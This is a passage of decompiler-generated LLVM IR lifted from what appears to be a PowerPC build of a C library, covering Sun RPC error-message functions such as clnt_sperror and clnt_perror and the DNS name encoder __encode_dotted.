  %v0_1002845c = load i32, i32* @r31, align 4
  %v1_1002845c = inttoptr i32 %v0_1002845c to i32*
  %v2_1002845c = load i32, i32* %v1_1002845c, align 4
  %v2_10028464 = add i32 %v0_10028454, %v0_10028458
  store i32 %v2_10028464, i32* %r29.global-to-local, align 4
  %v3_10028468 = icmp eq i32 %v2_1002845c, 12
  br i1 %v3_10028468, label %dec_label_pc_100284b8, label %dec_label_pc_1002847c

dec_label_pc_1002847c:                            ; preds = %dec_label_pc_10028418
  %v3_10028474 = icmp eq i32 %v2_1002845c, 14
  br i1 %v3_10028474, label %dec_label_pc_10028488, label %dec_label_pc_100284f0

dec_label_pc_10028488:                            ; preds = %dec_label_pc_1002847c
  %v4_10028488 = call i32 @strcpy(i32 %v2_10028464, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1002fc8c.1428, i32 0, i32 0))
  %v0_1002848c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1002848c, i32* @r3, align 4
  %v0_10028490 = call i32 @__GI_strlen()
  %v2_10028494 = add i32 %v0_1002848c, %v0_10028490
  store i32 %v2_10028494, i32* @r29, align 4
  %v0_10028498 = load i32, i32* @r31, align 4
  %v1_10028498 = add i32 %v0_10028498, 4
  %v2_10028498 = inttoptr i32 %v1_10028498 to i32*
  %v3_10028498 = load i32, i32* %v2_10028498, align 4
  store i32 %v3_10028498, i32* @r3, align 4
  %v0_1002849c = call i32 @__GI_clnt_sperrno()
  %v0_100284a4 = load i32, i32* @r29, align 4
  %v2_100284a8 = inttoptr i32 %v0_1002849c to i8*
  %v3_100284a8 = call i32 @strcpy(i32 %v0_100284a4, i8* %v2_100284a8)
  %v0_100284ac = load i32, i32* @r29, align 4
  store i32 %v0_100284ac, i32* @r3, align 4
  %v0_100284b0 = call i32 @__GI_strlen()
  br label %dec_label_pc_100284ec

dec_label_pc_100284b8:                            ; preds = %dec_label_pc_10028418
  %v2_10028438 = ptrtoint i32* %stack_var_-1048 to i32
  %v4_100284b8 = call i32 @strcpy(i32 %v2_10028464, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1002fc8c.1428, i32 0, i32 0))
  %v0_100284bc = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100284bc, i32* @r3, align 4
  %v0_100284c0 = call i32 @__GI_strlen()
  store i32 1024, i32* @r5, align 4
  %v2_100284c8 = add i32 %v0_100284bc, %v0_100284c0
  store i32 %v2_100284c8, i32* %r29.global-to-local, align 4
  %v0_100284cc = load i32, i32* @r31, align 4
  %v1_100284cc = add i32 %v0_100284cc, 8
  %v2_100284cc = inttoptr i32 %v1_100284cc to i32*
  %v3_100284cc = load i32, i32* %v2_100284cc, align 4
  store i32 %v3_100284cc, i32* @r3, align 4
  store i32 268600536, i32* @lr, align 4
  %v3_100284d4 = call i32 @__GI___glibc_strerror_r(i32 %v3_100284cc, i32 %v2_10028438, i32 1024)
  %v0_100284d8 = load i32, i32* @r29, align 4
  %v2_100284e0 = bitcast i32* %stack_var_-1048 to i8*
  %v3_100284e0 = call i32 @strcpy(i32 %v0_100284d8, i8* %v2_100284e0)
  %v0_100284e4 = load i32, i32* @r29, align 4
  store i32 %v0_100284e4, i32* @r3, align 4
  %v0_100284e8 = call i32 @__GI_strlen()
  br label %dec_label_pc_100284ec

dec_label_pc_100284ec:                            ; preds = %dec_label_pc_10028488, %dec_label_pc_100284b8
  %storemerge = phi i32 [ %v0_100284e8, %dec_label_pc_100284b8 ], [ %v0_100284b0, %dec_label_pc_10028488 ]
  %v0_100284ec = load i32, i32* @r29, align 4
  %v2_100284ec = add i32 %v0_100284ec, %storemerge
  store i32 %v2_100284ec, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100284f0

dec_label_pc_100284f0:                            ; preds = %dec_label_pc_1002847c, %dec_label_pc_100284ec
  %v2_100284f4 = phi i32 [ %v2_10028464, %dec_label_pc_1002847c ], [ %v2_100284ec, %dec_label_pc_100284ec ]
  %v3_100284f4 = add i32 %v2_100284f4, 1
  %v4_100284f4 = inttoptr i32 %v3_100284f4 to i8*
  store i8 0, i8* %v4_100284f4, align 1
  %v2_100284fc = load i32, i32* %r29.global-to-local, align 4
  %v3_100284fc = inttoptr i32 %v2_100284fc to i8*
  store i8 10, i8* %v3_100284fc, align 1
  %v0_10028504.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10028500

dec_label_pc_10028500:                            ; preds = %entry, %dec_label_pc_100284f0
  %v0_10028504 = phi i32 [ 0, %entry ], [ %v0_10028504.pre, %dec_label_pc_100284f0 ]
  ret i32 %v0_10028504

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 2, 0, 1, 4, 3, 5, 6, 7 }
  uselistorder i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1002fc8c.1428, i32 0, i32 0), { 1, 0 }
  uselistorder i32 14, { 3, 8, 9, 10, 1, 2, 12, 0, 11, 4, 5, 6, 7 }
  uselistorder i32 12, { 56, 201, 202, 182, 183, 184, 0, 185, 186, 187, 17, 66, 205, 29, 57, 58, 59, 60, 188, 61, 225, 18, 206, 226, 6, 227, 10, 11, 12, 19, 62, 63, 64, 65, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 207, 203, 204, 67, 70, 68, 69, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 208, 81, 82, 41, 20, 209, 21, 210, 211, 26, 83, 84, 85, 189, 212, 213, 214, 215, 216, 217, 218, 219, 5, 7, 220, 221, 222, 232, 86, 198, 199, 87, 234, 235, 236, 237, 4, 228, 1, 2, 3, 22, 23, 16, 88, 89, 24, 90, 91, 92, 190, 191, 192, 193, 93, 157, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 250, 194, 223, 224, 195, 196, 115, 111, 246, 247, 239, 240, 241, 242, 103, 243, 8, 94, 95, 96, 97, 98, 54, 99, 100, 101, 102, 104, 233, 248, 238, 105, 200, 25, 27, 28, 106, 231, 107, 230, 229, 249, 245, 244, 108, 109, 110, 55, 9, 112, 113, 114, 116, 117, 118, 119, 120, 121, 122, 123, 13, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 14, 152, 153, 154, 155, 156, 15, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 197 }
  uselistorder i32 ()* @__GI___rpc_thread_createerr, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10028500, { 1, 0 }
  uselistorder label %dec_label_pc_100284f0, { 1, 0 }
  uselistorder label %dec_label_pc_100284ec, { 1, 0 }
}

define i32 @clnt_pcreateerror() local_unnamed_addr {
entry:
  %v0_10028518 = load i32, i32* @lr, align 4
  store i32 268600620, i32* @lr, align 4
  %v0_10028528 = call i32 @clnt_spcreateerror()
  %v3_10028534 = load i32, i32* @global_var_1004513c, align 4
  store i32 %v0_10028518, i32* @lr, align 4
  %v3_10028544 = call i32 @__GI_fputs(i32 %v0_10028528, i32 %v3_10028534, i32 268697600)
  ret i32 %v3_10028544
}

define i32 @__GI_clnt_sperror() local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1052 = alloca i32, align 4
  %stack_var_-1064 = alloca i32, align 4
  %v0_10028554 = load i32, i32* @r3, align 4
  store i32 %v0_10028554, i32* @r31, align 4
  %v0_1002855c = load i32, i32* @r4, align 4
  store i32 %v0_1002855c, i32* @r30, align 4
  store i32 268600676, i32* @lr, align 4
  %v0_10028560 = call i32 @_buf()
  store i32 %v0_10028560, i32* %r28.global-to-local, align 4
  %v3_10028564 = icmp eq i32 %v0_10028560, 0
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_10028564, label %dec_label_pc_10028710, label %dec_label_pc_10028570

dec_label_pc_10028570:                            ; preds = %entry
  %v0_10028570 = load i32, i32* @r31, align 4
  %v1_10028570 = add i32 %v0_10028570, 4
  %v2_10028570 = inttoptr i32 %v1_10028570 to i32*
  %v3_10028570 = load i32, i32* %v2_10028570, align 4
  store i32 %v0_10028570, i32* %r3.global-to-local, align 4
  %v1_1002857c = add i32 %v3_10028570, 8
  %v2_1002857c = inttoptr i32 %v1_1002857c to i32*
  %v3_1002857c = load i32, i32* %v2_1002857c, align 4
  call void @__pseudo_call(i32 %v3_1002857c)
  %v0_10028594 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10028594, i32* @r3, align 4
  store i32 268600736, i32* @lr, align 4
  %v1_1002859c = call i32 @sprintf(i32 %v0_10028594)
  %v0_100285a0 = load i32, i32* @r28, align 4
  %v2_100285a0 = add i32 %v0_100285a0, %v1_1002859c
  store i32 %v2_100285a0, i32* %r29.global-to-local, align 4
  %v3_100285a4 = load i32, i32* %stack_var_-1064, align 4
  store i32 %v3_100285a4, i32* @r3, align 4
  %v0_100285a8 = call i32 @__GI_clnt_sperrno()
  store i32 %v2_100285a0, i32* %r3.global-to-local, align 4
  %v2_100285b4 = inttoptr i32 %v0_100285a8 to i8*
  %v3_100285b4 = call i32 @strcpy(i32 %v2_100285a0, i8* %v2_100285b4)
  %v0_100285b8 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100285b8, i32* @r3, align 4
  %v0_100285bc = call i32 @__GI_strlen()
  store i32 %v0_100285bc, i32* %r3.global-to-local, align 4
  %v3_100285c0 = load i32, i32* %stack_var_-1064, align 4
  %v2_100285c4 = add i32 %v0_100285b8, %v0_100285bc
  store i32 %v2_100285c4, i32* %r31.global-to-local, align 4
  %v2_100285c8 = icmp ugt i32 %v3_100285c0, 17
  br i1 %v2_100285c8, label %dec_label_pc_100286dc, label %dec_label_pc_100285d0

dec_label_pc_100285d0:                            ; preds = %dec_label_pc_10028570
  %v1_100285d4 = mul i32 %v3_100285c0, 4
  %v2_100285dc = add i32 %v1_100285d4, ptrtoint (i32* @global_var_1002fd10.1430 to i32)
  %v3_100285dc = inttoptr i32 %v2_100285dc to i32*
  %v4_100285dc = load i32, i32* %v3_100285dc, align 4
  %v2_100285e0 = add i32 %v4_100285dc, ptrtoint (i32* @global_var_1002fd10.1430 to i32)
  call void @__pseudo_branch(i32 %v2_100285e0)
  %v2_100285ec = ptrtoint i32* %stack_var_-1052 to i32
  store i32 %v2_100285ec, i32* %r29.global-to-local, align 4
  store i32 %tmp4, i32* @r3, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268600832, i32* @lr, align 4
  %v3_100285fc = call i32 @__GI___glibc_strerror_r(i32 %tmp4, i32 %v2_100285ec, i32 1024)
  %v0_1002860c = load i32, i32* @r31, align 4
  store i32 %v0_1002860c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10028618.1432 to i32), i32* @lr, align 4
  %v1_10028614 = call i32 @sprintf(i32 %v0_1002860c)
  br label %dec_label_pc_100286f8

dec_label_pc_100286dc:                            ; preds = %dec_label_pc_10028570
  store i32 %v2_100285c4, i32* @r3, align 4
  store i32 268601080, i32* @lr, align 4
  %v1_100286f4 = call i32 @sprintf(i32 %v2_100285c4)
  br label %dec_label_pc_100286f8

dec_label_pc_100286f8:                            ; preds = %dec_label_pc_100285d0, %dec_label_pc_100286dc
  %storemerge = phi i32 [ %v1_100286f4, %dec_label_pc_100286dc ], [ %v1_10028614, %dec_label_pc_100285d0 ]
  %v0_100286f8 = load i32, i32* @r31, align 4
  %v2_100286f8 = add i32 %v0_100286f8, %storemerge
  store i32 %v2_100286f8, i32* %r31.global-to-local, align 4
  %v0_10028700 = load i32, i32* @r28, align 4
  store i32 %v0_10028700, i32* %r3.global-to-local, align 4
  %v3_10028704 = add i32 %v2_100286f8, 1
  %v4_10028704 = inttoptr i32 %v3_10028704 to i8*
  store i8 0, i8* %v4_10028704, align 1
  %v2_1002870c = load i32, i32* %r31.global-to-local, align 4
  %v3_1002870c = inttoptr i32 %v2_1002870c to i8*
  store i8 10, i8* %v3_1002870c, align 1
  %v0_10028720.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10028710

dec_label_pc_10028710:                            ; preds = %entry, %dec_label_pc_100286f8
  %v0_10028720 = phi i32 [ 0, %entry ], [ %v0_10028720.pre, %dec_label_pc_100286f8 ]
  ret i32 %v0_10028720

; uselistorder directives
  uselistorder i32 %v2_100285c4, { 1, 0, 2 }
  uselistorder i32 %v2_100285a0, { 1, 0, 2 }
  uselistorder i32 %tmp4, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 2, 0, 1 }
  uselistorder i8 10, { 2, 3, 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 (i32, i32, i32)* @__GI___glibc_strerror_r, { 2, 1, 0 }
  uselistorder i32 1024, { 4, 23, 3, 26, 5, 6, 27, 56, 54, 1, 25, 57, 58, 55, 2, 24, 0, 16, 28, 29, 15, 30, 31, 14, 32, 33, 13, 34, 35, 12, 36, 37, 11, 38, 39, 10, 40, 41, 9, 42, 43, 8, 44, 45, 7, 46, 47, 17, 18, 19, 48, 49, 20, 50, 51, 21, 52, 53, 22 }
  uselistorder void (i32)* @__pseudo_branch, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 17, { 17, 0, 4, 2, 5, 24, 6, 18, 19, 20, 21, 7, 8, 9, 10, 11, 3, 27, 28, 25, 26, 23, 12, 13, 14, 1, 15, 22, 16 }
  uselistorder i32 (i32, i8*)* @strcpy, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 22, 19, 20, 21 }
  uselistorder i32 ()* @__GI_clnt_sperrno, { 0, 3, 2, 1 }
  uselistorder i32 (i32)* @sprintf, { 21, 23, 20, 22, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 8, { 117, 104, 0, 255, 256, 257, 258, 45, 46, 259, 262, 263, 264, 265, 266, 115, 34, 105, 106, 107, 1, 108, 109, 294, 267, 268, 269, 43, 302, 113, 335, 336, 337, 260, 261, 110, 2, 3, 111, 40, 112, 114, 131, 291, 292, 116, 4, 5, 6, 7, 8, 9, 118, 340, 119, 120, 121, 122, 339, 123, 124, 125, 126, 127, 128, 129, 293, 47, 130, 132, 133, 295, 296, 134, 135, 136, 42, 137, 138, 297, 69, 71, 70, 72, 73, 298, 299, 300, 301, 74, 139, 140, 10, 270, 303, 304, 305, 306, 307, 308, 309, 310, 33, 311, 312, 313, 350, 351, 380, 383, 27, 249, 250, 352, 35, 141, 36, 286, 287, 142, 362, 361, 359, 360, 341, 342, 343, 363, 364, 365, 11, 143, 48, 49, 144, 145, 50, 273, 274, 275, 51, 276, 146, 147, 52, 37, 38, 39, 148, 149, 150, 151, 152, 272, 234, 235, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 377, 378, 379, 12, 384, 13, 381, 382, 277, 278, 279, 271, 190, 314, 315, 316, 317, 318, 53, 319, 320, 321, 322, 14, 15, 323, 324, 28, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 26, 16, 353, 354, 355, 280, 281, 282, 283, 193, 194, 284, 188, 164, 165, 366, 367, 17, 18, 19, 20, 21, 100, 338, 101, 153, 154, 155, 158, 160, 161, 162, 159, 163, 156, 157, 166, 167, 168, 356, 357, 358, 373, 374, 375, 368, 369, 289, 64, 54, 65, 66, 67, 55, 169, 170, 171, 371, 370, 172, 173, 174, 175, 102, 347, 349, 178, 179, 180, 344, 345, 346, 348, 181, 288, 176, 177, 376, 372, 182, 183, 184, 185, 186, 187, 103, 56, 189, 290, 22, 23, 57, 58, 59, 60, 61, 62, 191, 192, 195, 196, 68, 44, 197, 198, 199, 41, 200, 29, 24, 30, 201, 202, 31, 25, 32, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 251, 252, 253, 254, 63, 285 }
  uselistorder i32 4, { 6, 419, 360, 205, 687, 688, 7, 168, 206, 8, 9, 632, 630, 631, 248, 633, 634, 635, 196, 10, 636, 637, 638, 639, 640, 641, 642, 11, 643, 420, 421, 689, 690, 231, 408, 305, 12, 13, 424, 14, 15, 197, 526, 16, 17, 18, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 20, 19, 21, 22, 713, 714, 715, 716, 717, 718, 644, 371, 372, 697, 698, 249, 23, 24, 751, 752, 753, 754, 452, 250, 25, 26, 174, 27, 28, 29, 30, 31, 32, 647, 648, 251, 33, 34, 373, 374, 375, 376, 377, 378, 175, 379, 380, 381, 306, 218, 307, 219, 308, 220, 309, 221, 699, 382, 428, 691, 692, 693, 694, 695, 35, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 703, 704, 705, 405, 406, 407, 700, 701, 702, 36, 37, 409, 410, 411, 412, 413, 414, 415, 416, 417, 38, 418, 39, 40, 41, 42, 422, 423, 760, 43, 171, 425, 426, 427, 44, 759, 696, 429, 430, 706, 431, 432, 433, 434, 435, 436, 45, 437, 707, 708, 709, 252, 310, 311, 208, 312, 313, 314, 315, 316, 207, 0, 317, 318, 438, 710, 232, 711, 712, 293, 294, 295, 46, 439, 440, 441, 442, 443, 444, 445, 761, 3, 47, 1, 719, 4, 48, 2, 655, 253, 49, 645, 646, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 770, 732, 176, 802, 809, 50, 51, 52, 53, 54, 55, 607, 608, 56, 609, 57, 610, 58, 771, 59, 446, 60, 61, 447, 62, 675, 676, 677, 678, 679, 680, 63, 448, 64, 65, 66, 449, 67, 450, 451, 777, 779, 778, 775, 776, 762, 763, 764, 765, 780, 781, 782, 766, 767, 68, 611, 69, 755, 756, 233, 453, 210, 454, 455, 456, 457, 458, 198, 459, 209, 460, 461, 462, 656, 254, 657, 658, 177, 70, 71, 659, 72, 660, 661, 662, 663, 664, 665, 199, 73, 666, 200, 74, 75, 212, 649, 651, 255, 652, 653, 654, 579, 574, 575, 576, 577, 578, 213, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 338, 76, 337, 339, 340, 77, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 793, 794, 733, 78, 79, 80, 201, 81, 222, 82, 202, 203, 83, 217, 734, 84, 85, 650, 86, 87, 803, 804, 805, 256, 806, 807, 808, 88, 795, 796, 797, 172, 173, 798, 799, 257, 800, 801, 89, 667, 90, 91, 92, 93, 94, 95, 96, 735, 97, 736, 737, 214, 738, 739, 740, 741, 742, 98, 99, 743, 744, 215, 745, 746, 216, 747, 748, 750, 100, 101, 169, 170, 749, 668, 102, 669, 258, 670, 496, 497, 498, 223, 5, 499, 500, 501, 671, 672, 490, 469, 783, 784, 103, 104, 105, 211, 106, 178, 107, 179, 463, 464, 108, 234, 109, 110, 111, 758, 112, 113, 757, 114, 465, 466, 467, 468, 470, 471, 472, 772, 773, 774, 115, 116, 117, 790, 791, 785, 681, 204, 683, 118, 296, 297, 298, 299, 300, 301, 302, 303, 119, 304, 120, 474, 473, 358, 475, 476, 477, 786, 787, 788, 682, 769, 768, 792, 789, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 566, 567, 684, 489, 491, 685, 259, 121, 122, 492, 123, 124, 125, 126, 127, 180, 260, 261, 262, 128, 129, 235, 263, 264, 265, 130, 266, 131, 181, 182, 267, 268, 132, 133, 493, 269, 494, 495, 502, 270, 503, 271, 504, 505, 506, 272, 224, 134, 183, 135, 273, 236, 275, 136, 184, 274, 137, 138, 139, 185, 507, 508, 140, 186, 237, 277, 141, 187, 276, 225, 509, 238, 279, 142, 188, 278, 226, 510, 143, 144, 239, 511, 512, 227, 240, 513, 514, 145, 515, 146, 516, 147, 517, 148, 518, 149, 519, 150, 520, 521, 280, 522, 523, 524, 151, 189, 152, 618, 153, 525, 527, 281, 528, 529, 154, 530, 282, 531, 532, 155, 533, 534, 283, 535, 536, 156, 228, 537, 190, 538, 539, 540, 542, 541, 241, 543, 544, 545, 546, 284, 547, 157, 229, 548, 191, 549, 550, 551, 553, 552, 242, 554, 555, 556, 557, 558, 285, 559, 158, 560, 192, 561, 243, 562, 563, 564, 286, 565, 159, 230, 568, 193, 569, 570, 244, 571, 572, 287, 573, 288, 580, 581, 582, 583, 584, 585, 587, 586, 245, 588, 589, 590, 591, 160, 161, 592, 593, 594, 246, 595, 596, 597, 598, 599, 601, 600, 247, 602, 603, 604, 289, 605, 606, 612, 613, 614, 615, 616, 617, 619, 620, 621, 290, 622, 623, 624, 162, 163, 164, 625, 626, 627, 628, 291, 629, 673, 292, 674, 194, 165, 195, 166, 686, 167, 359 }
  uselistorder label %dec_label_pc_10028710, { 1, 0 }
  uselistorder label %dec_label_pc_100286f8, { 1, 0 }
}

define i32 @clnt_perror(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_10028724 = load i32, i32* @lr, align 4
  store i32 268601144, i32* @lr, align 4
  %v0_10028734 = call i32 @__GI_clnt_sperror()
  %v3_10028740 = load i32, i32* @global_var_1004513c, align 4
  store i32 %v0_10028724, i32* @lr, align 4
  %v3_10028750 = call i32 @__GI_fputs(i32 %v0_10028734, i32 %v3_10028740, i32 268697600)
  ret i32 %v3_10028750

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @__GI_fputs, { 4, 6, 5, 3, 1, 2, 0 }
  uselistorder i32 268697600, { 6, 7, 8, 9, 154, 54, 55, 1, 2, 158, 159, 5, 4, 143, 10, 144, 11, 31, 12, 13, 32, 56, 57, 58, 3, 59, 14, 15, 152, 16, 0, 161, 17, 169, 18, 33, 166, 167, 74, 145, 146, 147, 153, 162, 163, 168, 148, 149, 72, 73, 19, 62, 63, 164, 165, 155, 156, 157, 60, 61, 160, 150, 38, 39, 40, 20, 41, 42, 43, 44, 45, 46, 47, 21, 65, 34, 64, 66, 67, 68, 69, 35, 70, 48, 49, 50, 51, 52, 53, 22, 23, 24, 97, 25, 98, 99, 151, 71, 26, 27, 36, 28, 75, 77, 76, 78, 80, 79, 81, 82, 83, 84, 85, 86, 88, 87, 89, 91, 90, 92, 93, 94, 95, 96, 100, 102, 101, 103, 105, 104, 106, 108, 107, 109, 111, 110, 112, 113, 114, 115, 116, 118, 117, 119, 121, 120, 122, 123, 125, 124, 126, 128, 127, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 37, 29, 30 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10028758 = load i32, i32* @lr, align 4
  store i32 %v0_10028758, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_10028764 = load i32, i32* @r4, align 4
  store i32 %v0_10028764, i32* @r29, align 4
  %v0_10028768 = load i32, i32* @r5, align 4
  store i32 %v0_10028768, i32* %r27.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  %v3_100287d413 = icmp eq i8* %arg1, null
  store i32 %tmp, i32* @r3, align 4
  br i1 %v3_100287d413, label %dec_label_pc_100287f0, label %dec_label_pc_100287e4

dec_label_pc_10028778:                            ; preds = %dec_label_pc_100287e4
  store i32 268601212, i32* @lr, align 4
  %v3_10028778 = call i32 @__GI_strchr(i32 %v0_100287e414, i32 46)
  store i32 %v3_10028778, i32* @r30, align 4
  %v3_1002877c = icmp eq i32 %v3_10028778, 0
  %v0_10028780 = load i32, i32* @r31, align 4
  store i32 %v0_10028780, i32* @r3, align 4
  %v2_10028784 = sub i32 %v3_10028778, %v0_10028780
  store i32 %v2_10028784, i32* %r0.global-to-local, align 4
  br i1 %v3_1002877c, label %dec_label_pc_1002878c, label %dec_label_pc_10028794

dec_label_pc_1002878c:                            ; preds = %dec_label_pc_10028778
  %v0_1002878c = call i32 @__GI_strlen()
  store i32 %v0_1002878c, i32* %r3.global-to-local, align 4
  %sext = mul i32 %v0_1002878c, 16777216
  %v1_10028790 = sdiv i32 %sext, 16777216
  store i32 %v1_10028790, i32* %r0.global-to-local, align 4
  %v0_100287a4.pre = load i32, i32* @r31, align 4
  %v0_100287b4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10028794

dec_label_pc_10028794:                            ; preds = %dec_label_pc_10028778, %dec_label_pc_1002878c
  %v0_100287b4 = phi i32 [ %v3_10028778, %dec_label_pc_10028778 ], [ %v0_100287b4.pre, %dec_label_pc_1002878c ]
  %v0_100287a4 = phi i32 [ %v0_10028780, %dec_label_pc_10028778 ], [ %v0_100287a4.pre, %dec_label_pc_1002878c ]
  %v0_100287c0 = phi i32 [ %v2_10028784, %dec_label_pc_10028778 ], [ %v1_10028790, %dec_label_pc_1002878c ]
  %v0_10028798 = load i32, i32* @r28, align 4
  %v1_10028798 = load i32, i32* %r27.global-to-local, align 4
  %v2_10028798 = sub i32 %v1_10028798, %v0_10028798
  %v1_1002879c = add i32 %v0_10028798, 1
  store i32 %v1_1002879c, i32* %r11.global-to-local, align 4
  %v1_100287a0 = add i32 %v2_10028798, -1
  store i32 %v0_100287a4, i32* @r4, align 4
  %v0_100287a8 = load i32, i32* @r29, align 4
  %v2_100287a8 = add i32 %v0_100287a8, %v1_1002879c
  store i32 %v2_100287a8, i32* @r3, align 4
  store i32 %v0_100287c0, i32* @r5, align 4
  %v2_100287b0 = icmp ult i32 %v0_100287c0, %v1_100287a0
  %v1_100287b4 = add i32 %v0_100287b4, 1
  store i32 %v1_100287b4, i32* @r31, align 4
  %v3_10028794.not = icmp ne i32 %v0_100287c0, 0
  %or.cond = and i1 %v2_100287b0, %v3_10028794.not
  br i1 %or.cond, label %dec_label_pc_100287c0, label %dec_label_pc_10028808

dec_label_pc_100287c0:                            ; preds = %dec_label_pc_10028794
  %v3_100287c0 = trunc i32 %v0_100287c0 to i8
  %v4_100287c0 = add i32 %v0_100287a8, %v0_10028798
  %v5_100287c0 = inttoptr i32 %v4_100287c0 to i8*
  store i8 %v3_100287c0, i8* %v5_100287c0, align 1
  %v0_100287c4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100287c4 = load i32, i32* %r0.global-to-local, align 4
  %v2_100287c4 = add i32 %v1_100287c4, %v0_100287c4
  store i32 %v2_100287c4, i32* @r28, align 4
  store i32 268601292, i32* @lr, align 4
  %v0_100287c8 = call i32 @memcpy()
  store i32 %v0_100287c8, i32* %r3.global-to-local, align 4
  %v0_100287cc = load i32, i32* @r30, align 4
  %v3_100287cc = icmp eq i32 %v0_100287cc, 0
  br i1 %v3_100287cc, label %dec_label_pc_100287f0, label %dec_label_pc_100287c0.dec_label_pc_100287d4_crit_edge

dec_label_pc_100287c0.dec_label_pc_100287d4_crit_edge: ; preds = %dec_label_pc_100287c0
  %v0_100287d4.pre = load i32, i32* @r31, align 4
  %v3_100287d4 = icmp eq i32 %v0_100287d4.pre, 0
  store i32 %v0_100287d4.pre, i32* @r3, align 4
  br i1 %v3_100287d4, label %dec_label_pc_100287f0, label %dec_label_pc_100287e4

dec_label_pc_100287e4:                            ; preds = %entry, %dec_label_pc_100287c0.dec_label_pc_100287d4_crit_edge
  %v0_100287e414 = phi i32 [ %v0_100287d4.pre, %dec_label_pc_100287c0.dec_label_pc_100287d4_crit_edge ], [ %tmp, %entry ]
  %v1_100287e4 = inttoptr i32 %v0_100287e414 to i8*
  %v2_100287e4 = load i8, i8* %v1_100287e4, align 1
  %v3_100287e4 = zext i8 %v2_100287e4 to i32
  store i32 %v3_100287e4, i32* %r0.global-to-local, align 4
  %v3_100287e8 = icmp eq i8 %v2_100287e4, 0
  br i1 %v3_100287e8, label %dec_label_pc_100287f0, label %dec_label_pc_10028778

dec_label_pc_100287f0:                            ; preds = %dec_label_pc_100287c0.dec_label_pc_100287d4_crit_edge, %dec_label_pc_100287c0, %dec_label_pc_100287e4, %entry
  %v0_100287f0 = load i32, i32* %r27.global-to-local, align 4
  %tmp10 = icmp slt i32 %v0_100287f0, 1
  br i1 %tmp10, label %dec_label_pc_10028808, label %dec_label_pc_100287f8

dec_label_pc_100287f8:                            ; preds = %dec_label_pc_100287f0
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_100287fc = load i32, i32* @r28, align 4
  %v1_100287fc = add i32 %v0_100287fc, 1
  store i32 %v1_100287fc, i32* %r3.global-to-local, align 4
  %v1_10028800 = load i32, i32* @r29, align 4
  %v4_10028800 = add i32 %v1_10028800, %v0_100287fc
  %v5_10028800 = inttoptr i32 %v4_10028800 to i8*
  store i8 0, i8* %v5_10028800, align 1
  %v0_1002881c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1002880c

dec_label_pc_10028808:                            ; preds = %dec_label_pc_10028794, %dec_label_pc_100287f0
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1002880c

dec_label_pc_1002880c:                            ; preds = %dec_label_pc_100287f8, %dec_label_pc_10028808
